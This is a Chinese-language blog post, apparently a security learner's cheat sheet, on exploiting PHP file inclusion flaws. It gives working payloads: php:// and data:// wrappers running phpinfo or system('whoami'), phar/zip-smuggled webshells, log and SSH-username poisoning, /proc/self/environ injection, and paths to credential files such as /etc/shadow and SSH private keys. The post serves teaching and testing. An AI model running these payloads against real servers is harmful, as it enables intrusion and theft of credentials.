@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件包含看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了  PHP的文件包含可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once 1234567include类型的包">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;30&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="文件包含看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了  PHP的文件包含可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once 1234567include类型的包">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;30&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&#x2F;%E4%BE%8B%E5%AD%90.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;30&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&#x2F;user-agent%E6%B3%A8%E5%85%A5.png">
+<meta property="og:updated_time" content="2019-12-05T12:02:23.132Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;30&#x2F;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&#x2F;%E4%BE%8B%E5%AD%90.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2019/11/30/文件包含/"/>
+
+
+
+
+
+  <title>文件包含 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-30T20:49:42+08:00">
+                2019-11-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>看了一天的二进制，先暂时不继续了。写一写关于文件包含的姿势，下面说的较多是能 getshell 的技巧，只包含出敏感文件这里就不多说了</p>
+<p> PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可 ，一般来说php使用的文件包含函数有四个：include、include_once、require、require_once</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>类型的包含文件时即使遇到错误，下面代码会依然执行</span><br><span class="line"><span class="keyword">include</span>()：</span><br><span class="line"><span class="keyword">include_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br><span class="line">    </span><br><span class="line"><span class="keyword">require</span>类型的包含文件时遇到错误直接退出</span><br><span class="line"><span class="keyword">require</span>()：</span><br><span class="line"><span class="keyword">require_once</span>()：先验证是否已经包含了文件，如果已经包含了，就不再执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul>
+<li><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<blockquote>
+<p>allow_url_include = On;</p>
+<p>allow_url_fopen 无要求;</p>
+</blockquote>
+<p>范例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<hr>
+<ul>
+<li><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：</p>
+<blockquote>
+<p>无要求；</p>
+</blockquote>
+<p>范例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<hr>
+<ul>
+<li><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<blockquote>
+<p>php版本 &gt;= 5.3.0</p>
+</blockquote>
+</li>
+</ul>
+<p>  范例：</p>
+<p>  场景一：文件限定支持上传 zip 等压缩包格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写<code>&lt;?php phpinfo(); ?&gt;</code> 的读取 phpinfo 的 txt (这里也可以直接写一句话木马 shabi.php )。然后添加到压缩包 test.zip 里面并且成功上传，然后通过 phar 就能读出压缩包里面的txt文件并且使其能被执行：</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.zip/phpinfo.txt</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>  场景二：文件限定支持上传 jpg 等图片格式并且不支持php上传，并且含有文件包含漏洞。我们可以先写一句话木马 shabi.php ，然后添加到压缩包 test.zip 里面，并且将 test.zip 改名为 test.jpg ，这样就能成功上传并且能通过 phar 读出压缩包里面的一句话木马并且执行：‘</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定绝对路径：</span><br><span class="line">index.php?file=phar:<span class="comment">//E:/phpStudy/WWW/test.jpg/shabi.php</span></span><br><span class="line"></span><br><span class="line">指定相对路径（下面这样是压缩文件和index.php在同一目录）：</span><br><span class="line">index.php?file=phar:<span class="comment">//test.jpg/shabi.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<ul>
+<li><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件</p>
+<blockquote>
+<p>php版本 &gt;= 5.3.0</p>
+<p>需要指定绝对路径</p>
+<p>构造压缩包的方法等同于phar</p>
+</blockquote>
+<p>范例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=zip:<span class="comment">//E:/phpStudy/WWW/test.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里的 %23 是 # 的url编码</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<ul>
+<li><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>利用条件</p>
+<blockquote>
+<p>php版本大于等于php5.2</p>
+<p>allow_url_fopen = On</p>
+<p>allow_url_include = On</p>
+</blockquote>
+<p>范例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">接收文本执行命令：</span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">接收base64编码文件执行命令:</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="number">2</span>b </span><br><span class="line"></span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>%2b 是 + 的url编码，解码后PD9waHAgcGhwaW5mbygpOz8+这串base64串解码后是</p>
+<p> <code>&lt;?php phpinfo();  ?&gt;</code></p>
+<p>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 这串base64串解码后是</p>
+<p><code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h2 id="日志包含getshell"><a href="#日志包含getshell" class="headerlink" title="日志包含getshell"></a>日志包含getshell</h2><p>当存在文件包含漏洞的时候，我们往往可以通过污染日志并且包含来getshell。</p>
+<p>污染日志的原理就是通过访问一个错误的请求让日志记录下这条记录，我们在访问错误记录时使用代码进行请求，然后再通过文件包含包含出来，就能达到执行的目的了：</p>
+<p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E4%BE%8B%E5%AD%90.png" alt></p>
+<p>标上红标的地方改为一句话木马，然后包含出来就能getshell了。</p>
+<blockquote>
+<p>因为浏览器的编码问题，污染日志的一句话可能被自动加上url编码导致包含时会失效。</p>
+<p>解决方法：1、用bp改回参数；2、用curl命令发请求</p>
+</blockquote>
+<p>附上各种能污染的WEB日志的路径：</p>
+<h3 id="Apache日志："><a href="#Apache日志：" class="headerlink" title="Apache日志："></a>Apache日志：</h3><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，error.log的默认路径是在在</p>
+<ul>
+<li>/var/log/apache2/error.log</li>
+</ul>
+<p>下面是其他一般日志的路径</p>
+<ul>
+<li>/var/log/apache/access_log</li>
+<li>/var/www/logs/access_log</li>
+<li>/var/log/access_log</li>
+<li>/var/log/apache2/access.log </li>
+</ul>
+<hr>
+<h3 id="SSH日志："><a href="#SSH日志：" class="headerlink" title="SSH日志："></a>SSH日志：</h3><p>需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure>
+
+<p>然后提示密码输入，随意输入就会登录失败。</p>
+<p>之后在 remotehost 的 ssh-log 中就会出现刚刚登录的php代码，对 ssh-log包含即可执行。</p>
+<hr>
+<h2 id="environ包含getshell"><a href="#environ包含getshell" class="headerlink" title="environ包含getshell"></a>environ包含getshell</h2><p>利用条件：</p>
+<blockquote>
+<p>php以cgi方式运行，这样environ才会保持UA头。</p>
+<p>environ文件存储位置已知，且environ文件可读。</p>
+</blockquote>
+<p>/proc/self/environ： Linux下的当前正在运行的进程的环境变量列表 ，访问能看到里面会有http请求头的信息。于是我们可以通过 user-agent变量进行代码注入，然后通过文件包含来读取并执行代码。</p>
+<p>范例：</p>
+<p><img src="/2019/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/user-agent%E6%B3%A8%E5%85%A5.png" alt></p>
+<blockquote>
+<p>上面例子是反弹了一个shell，我们也可以注普通的一句话</p>
+</blockquote>
+<hr>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>session 文件格式为 sess_[phpsessid] , phpsessid 作为cookie传递，在服务端文件位置会变化</p>
+<p>默认路径是：</p>
+<ul>
+<li>/tmp/(PHP Sessions)</li>
+</ul>
+<p>也可能位于下面路径：</p>
+<ul>
+<li>/var/lib/php/session/(PHP Sessions)</li>
+<li>/var/lib/php5/(PHP Sessions)</li>
+<li>c:/windows/temp/(PHP Sessions)等文件中</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇因为期末写了好多天，哎，长路漫漫，漫漫奋斗</p>
+<p>附上敏感文件：</p>
+<p>Linux下：</p>
+<p> ssh免密码登录的秘钥文件等 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys </span><br><span class="line">/root/.ssh/id_rsa </span><br><span class="line">/root/.ssh/id_rsa.keystore </span><br><span class="line">/root/.ssh/id_rsa.pub </span><br><span class="line">/root/.ssh/known_hosts</span><br></pre></td></tr></table></figure>
+
+<p>加密后的用户口令位置 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/shadow 历史命令 </span><br><span class="line">/root/.bash_history /root/.mysql_history</span><br></pre></td></tr></table></figure>
+
+<p>进程文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/fd/fd[0-9]* (文件标识符)</span><br></pre></td></tr></table></figure>
+
+<p>检查已经被系统挂载的设备 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/mounts</span><br></pre></td></tr></table></figure>
+
+<p>机器的内核配置文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/config.gz</span><br></pre></td></tr></table></figure>
+
+
+
+<p>window下 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:/boot.ini  //查看系统版本  </span><br><span class="line">C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件  </span><br><span class="line">C:/Windows/repairsam  //存储系统初次安装的密码  </span><br><span class="line">C:/Program Files/mysqlmy.ini  //Mysql配置  </span><br><span class="line">C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root  </span><br><span class="line">C:/Windows/php.ini  //php配置信息  </span><br><span class="line">C:/Windows/my.ini  //Mysql配置信息</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="next" title="系统栈和经典栈溢出">
+                <i class="fa fa-chevron-left"></i> 系统栈和经典栈溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#伪协议"><span class="nav-number">1.1.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input"><span class="nav-number">1.1.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter"><span class="nav-number">1.1.2.</span> <span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar"><span class="nav-number">1.1.3.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip"><span class="nav-number">1.1.4.</span> <span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data"><span class="nav-number">1.1.5.</span> <span class="nav-text">data://</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志包含getshell"><span class="nav-number">1.2.</span> <span class="nav-text">日志包含getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache日志："><span class="nav-number">1.2.1.</span> <span class="nav-text">Apache日志：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH日志："><span class="nav-number">1.2.2.</span> <span class="nav-text">SSH日志：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#environ包含getshell"><span class="nav-number">1.3.</span> <span class="nav-text">environ包含getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#包含session"><span class="nav-number">1.4.</span> <span class="nav-text">包含session</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
